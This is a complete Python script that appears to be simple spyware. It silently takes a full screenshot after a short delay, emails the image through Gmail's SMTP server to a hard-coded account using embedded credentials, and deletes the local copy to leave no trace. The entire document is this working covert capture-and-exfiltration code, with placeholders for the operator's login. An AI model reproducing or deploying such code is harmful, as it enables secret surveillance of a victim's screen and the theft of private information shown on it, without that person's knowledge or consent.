import pyautogui
import os
import tempfile
import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

class Screenshot:
    def __init__(self,  email,  passwd):
        self.email = email
        self.passwd = passwd
        
    def send_mail(self,email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        message = message.as_string()
        server.sendmail(email,email,message)
        server.quit()

    def take_screenshot(self):
        os.chdir(tempfile.gettempdir())
        screenshot  = pyautogui.screenshot()
        screenshot.save("Test.png")
        return tempfile.gettempdir() + "/Test.png"

    def multipart_object(self,fromaddr):
        msg = MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = fromaddr
        return msg

    def base_object(self,filename, attachment):
        payload = MIMEBase('application', 'octet-stream')
        payload.set_payload((attachment).read())
        encoders.encode_base64(payload)
        payload.add_header('Content-Disposition', "attachment; filename= %s" % filename)
        return payload

    def run(self):
        message = self.multipart_object(self.email)
        time.sleep(5)
        path = self.take_screenshot()
        filename = "ABCD.png"
        attachment = open(path, "rb")
        payload = self.base_object(filename, attachment)
        message.attach(payload)
        self.send_mail(self.email, self.passwd, message)
        os.remove(path)

my_screenshot = Screenshot("Your Gmail ID", "Your Gmail Password")
my_screenshot.run()